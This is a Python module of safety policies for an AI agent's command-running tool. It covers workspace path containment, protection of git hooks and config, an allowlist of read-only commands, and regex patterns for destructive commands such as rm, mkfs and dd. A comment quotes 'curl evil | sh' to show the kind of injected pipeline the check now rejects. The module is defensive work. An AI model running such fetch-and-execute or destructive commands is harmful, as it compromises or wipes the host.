"""Policy helpers for the node's run_command tool.

Two halves live here, and they have different dependencies:

* the classifiers (workspace containment, "is this command safe / destructive")
  are plain Python and are what the security tests pin;
* the builders around them (get_mesh_policies, evaluate_policies) need the
  private Google Antigravity SDK.

The SDK is optional - the MCP server, the menu and everything the tests exercise
work without it - so the import is guarded. A module-level import of the SDK used
to turn *every* test session on a machine without it into a single collection
ERROR ("ModuleNotFoundError: No module named 'google'"), which is exactly what
the Linux CI runners did: they install the SDK on Windows only. Importing this
module must therefore never require it.
"""

from __future__ import annotations

import os
import re
import shlex
from typing import Awaitable, Callable, List, Optional, Tuple, Union

try:  # pragma: no cover - the import succeeds on a node with the SDK installed
    from google.antigravity import types
    from google.antigravity.hooks import policy
    from google.antigravity.hooks.policy import Policy, Decision

    HAS_SDK = True
except ImportError:  # pragma: no cover - exercised by tests/test_policies_without_sdk.py
    types = None  # type: ignore[assignment]
    policy = None  # type: ignore[assignment]
    Policy = object  # type: ignore[assignment,misc]
    Decision = None  # type: ignore[assignment]
    HAS_SDK = False


def require_sdk() -> None:
    """Fail with a usable message instead of an AttributeError on ``None``."""
    if not HAS_SDK:
        raise RuntimeError(
            "core.policies needs the Google Antigravity SDK for policy hooks; "
            "install it with pip install google-antigravity. The workspace and "
            "command classifiers work without it."
        )
def _platform_root(posix_root: str) -> str:
    """Express a documented deployment root for the host running this node.

    ``/root/...`` is an absolute path on Linux but only drive-relative on Windows,
    where the SDK refuses it outright ("app_data_dir must be an absolute path") and
    ``os.makedirs`` would scatter a ``\\root\\...`` tree beside the drive root. The
    POSIX path is kept unchanged on POSIX hosts, so deployed services do not move.
    """
    if os.name != "nt":
        return posix_root
    leaf = posix_root.rstrip("/").rsplit("/", 1)[-1]
    return os.path.join(os.path.expanduser("~"), leaf)


# Workspace roots are read from the environment ONLY -- never hardcode a personal
# home directory. Point MESH_COORDINATOR_WORKSPACE / MESH_WORKSPACE at the real
# deployment paths in the service environment. The documented defaults are the
# Linux deployment paths; on Windows the same roots live under the user profile.
#: Roots used before the rename: a deployment that still lives in one of them keeps
#: being writable, so upgrading the code does not lock the node out of its own tree.
LEGACY_WORKSPACES = [
    _platform_root("/root/antigravity-mesh"),
    _platform_root("/root/agy-gdrive-runner"),
]

ALLOWED_WORKSPACES = [
    os.environ.get("MESH_COORDINATOR_WORKSPACE") or _platform_root("/root/agy-gdrive-runner"),
    os.environ.get("MESH_WORKSPACE") or _platform_root("/root/remote-harness-mcp"),
] + LEGACY_WORKSPACES

SAFE_COMMAND_PREFIXES = [
    "git status",
    "git log",
    "git diff",
    "systemctl status",
    "uptime",
    "ls",
    "ps",
    "cat",
    "echo",
    "whoami",
    "uname",
    "df",
    "free",
]

DESTRUCTIVE_COMMAND_PATTERNS = [
    re.compile(r"\breboot\b"),
    re.compile(r"\bshutdown\b"),
    re.compile(r"\bsystemctl\s+(stop|disable|mask|restart)\b"),
    re.compile(r"\brm\s+"),
    re.compile(r"\bpkill\b"),
    re.compile(r"\bkill\s+-9\b"),
    re.compile(r"\bmkfs\b"),
    re.compile(r"\bdd\s+"),
]

def _is_within(path: str, root: str) -> bool:
    """True when *path* is *root* itself or lives inside it.

    The comparison has to use the platform separator: ``root + "/"`` never
    matches a normpath'ed Windows path, so every file inside an allowed workspace
    was rejected there and the policy could not be satisfied at all.
    """
    if path == root:
        return True
    root = root.rstrip("/\\")
    for sep in {os.sep, "/", "\\"}:
        if path.startswith(root + sep):
            return True
    return False


def validate_workspace_path(path: str, allowed_workspaces: Optional[List[str]] = None) -> bool:
    workspaces = allowed_workspaces or ALLOWED_WORKSPACES
    abs_path = os.path.abspath(path)
    for ws in workspaces:
        if _is_within(abs_path, os.path.abspath(ws)):
            return True
    return False

def _normalize_git_part(part: str) -> str:
    cleaned = part.lower()
    if os.name == "nt":
        # Strip NTFS alternate data streams (e.g. "config::$DATA") and trailing
        # dots/spaces, which Win32 silently ignores when resolving paths.
        if ":" in cleaned and not (len(cleaned) == 2 and cleaned[1] == ":"):
            cleaned = cleaned.split(":", 1)[0]
        cleaned = cleaned.rstrip(". ")
    return cleaned


def _has_protected_git_segments(path_str: str) -> bool:
    norm = os.path.normpath(path_str).replace("\\", "/")
    parts = [_normalize_git_part(p) for p in norm.split("/") if p and p != "."]
    for idx, part in enumerate(parts):
        if part == ".git" and idx + 1 < len(parts):
            nxt = parts[idx + 1]
            if nxt in ("hooks", "config"):
                return True
    return False


def is_protected_git_path(path: Union[str, os.PathLike[str]]) -> bool:
    """Return True if *path* targets ``.git/hooks/*`` or ``.git/config``.

    Accounts for lexical path normalization (``..``, mixed separators),
    case-insensitivity (including Windows NTFS ADS/trailing dots), and
    symlink resolution via ``os.path.realpath``.
    """
    if not path:
        return False
    try:
        raw = os.fspath(path)
    except TypeError:
        return False
    if not isinstance(raw, str) or not raw.strip():
        return False

    candidates = [raw]
    try:
        candidates.append(os.path.abspath(raw))
    except OSError:
        pass
    try:
        candidates.append(os.path.realpath(raw))
    except OSError:
        pass

    return any(_has_protected_git_segments(candidate) for candidate in candidates)


def check_write_allowed(path: Union[str, os.PathLike[str]]) -> Tuple[bool, str]:
    """Check whether writing or editing *path* is permitted by safety policies.

    Returns ``(True, "")`` when allowed, or ``(False, reason)`` when blocked.
    """
    if is_protected_git_path(path):
        return (
            False,
            f"Refusing to write or edit protected git path (.git/hooks/* or .git/config): {os.fspath(path)}",
        )
    return True, ""


def _extract_command(args: dict) -> str:
    if not isinstance(args, dict):
        return ""
    return str(args.get("command") or args.get("CommandLine") or "").strip()

def _command_tokens(cmd: str) -> List[str]:
    lexer = shlex.shlex(cmd, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    return list(lexer)


#: Any of these tokens means the command is a pipeline, a list or a redirect:
#: it can no longer be classified by its first word, so it is never "safe".
_SHELL_OPERATORS = {";", "|", "&", "&&", "||", "$", "`", "(", ")", "<", ">", "\n"}


def is_safe_command(args: dict) -> bool:
    cmd = _extract_command(args)
    if not cmd:
        return False
    try:
        tokens = _command_tokens(cmd)
    except ValueError:
        return False
    if not tokens or any(token in _SHELL_OPERATORS for token in tokens):
        # ``cat README.md; curl evil | sh`` starts with "cat" but is a pipeline:
        # prefix matching used to wave it through without a confirmation.
        return False
    joined = " ".join(tokens)
    return any(joined == prefix or joined.startswith(prefix + " ")
               for prefix in SAFE_COMMAND_PREFIXES)

def is_destructive_command(args: dict) -> bool:
    cmd = _extract_command(args)
    if not cmd:
        return False
    return any(pat.search(cmd) for pat in DESTRUCTIVE_COMMAND_PATTERNS)

async def default_deny_handler(tool_call: types.ToolCall) -> bool:
    return False

def get_mesh_policies(
    allowed_workspaces: Optional[List[str]] = None,
    ask_user_handler: Optional[Callable[[types.ToolCall], Awaitable[bool]]] = None,
) -> List[Policy]:
    require_sdk()
    handler = ask_user_handler or default_deny_handler
    policies: List[Policy] = []

    # 1. Ask user for destructive commands
    policies.append(
        policy.ask_user(
            "run_command",
            when=is_destructive_command,
            handler=handler,
            name="confirm_destructive",
        )
    )

    # 2. Allow safe commands without confirmation
    policies.append(
        policy.allow(
            "run_command",
            when=is_safe_command,
            name="allow_safe_commands",
        )
    )

    return policies

async def evaluate_policies(policies: List[Policy], tool_call: types.ToolCall) -> types.HookResult:
    require_sdk()
    hook = policy._PolicyDecideHook(policies)
    return await hook.run(None, tool_call)
